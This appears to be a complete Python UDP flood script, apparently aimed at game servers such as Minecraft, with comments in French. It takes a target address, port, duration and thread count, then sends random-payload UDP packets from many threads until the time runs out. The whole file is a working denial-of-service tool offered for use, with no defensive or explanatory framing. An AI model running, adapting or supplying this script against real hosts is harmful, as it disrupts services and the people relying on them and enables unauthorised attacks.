import sys
import time
import random
import socket
import os
import threading


def minecraftsexptdr(ip,port,temps):
    timeout = time.time() + float(temps)
    udpsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    #rawsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    sent = 0
    #taille du packet
    bytes = random._urandom(256)
    while True:
                    try:
                            if time.time() > timeout :
                                    break
                            else:
                                    pass
                            ran = random.randrange(10**80)
                            hex = "%064x" % ran
                            hex = hex[:64] 
                            udpsock.sendto(bytes.fromhex(hex) + bytes,(ip,int(port)))
                            #rawsock.sendto(bytes.fromhex(hex) + bytes,(ip,int(port))) 
                            sent = sent + 1
                    except KeyboardInterrupt:
                            sys.exit(os.system("clear"))

def main():
    ip = sys.argv[1]
    port = int(sys.argv[2])
    temps = int(sys.argv[3])
    threads = int(sys.argv[4])
    for i in range(0, threads):
        thread = threading.Thread(target=minecraftsexptdr, args=(ip,port,temps))
        thread.start()
        
if __name__ == "__main__":
    main()
